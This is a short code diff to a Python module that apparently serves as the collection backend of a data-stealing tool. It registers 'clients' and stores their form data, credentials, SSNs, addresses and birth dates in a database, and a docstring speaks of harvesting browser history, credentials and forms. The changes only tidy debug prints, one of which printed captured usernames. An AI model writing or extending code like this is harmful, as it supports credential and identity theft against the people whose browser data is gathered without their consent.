@@ -60,7 +60,7 @@ def is_online(clientid):
     elif len(found) == 0:
         return 0
     else:
-        print("how does your client have more than one sid fam how")
+        print("client has more than one sid: " + str(found))
         return len(found)
 
 
@@ -96,11 +96,11 @@ for example, browser history, credentials, forms, etc.
 """
 def create_new_client(data):
     with getConn() as conn:
-        print('creating new client')
+        #print('creating new client')
         conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (None, None, None, None, None, None, None, None, None, None, None, None))
         conn.execute('SELECT LAST_INSERT_ID()')
         curID = conn.fetchall()[0][0]
-        print('new id: {}'.format(curID))
+        #print('new id: {}'.format(curID))
         formsList = data["forms"]
     for x in formsList:
         store_form_data(x, curID)
@@ -312,7 +312,7 @@ def store_form_data(data, clientid):
                     conn.execute(execStr)
         
         #credentials information
-        print(credentials.get("Username", None))
+        #print(credentials.get("Username", None))
     store_credential(credentials, clientid)
     with getConn() as conn:
 
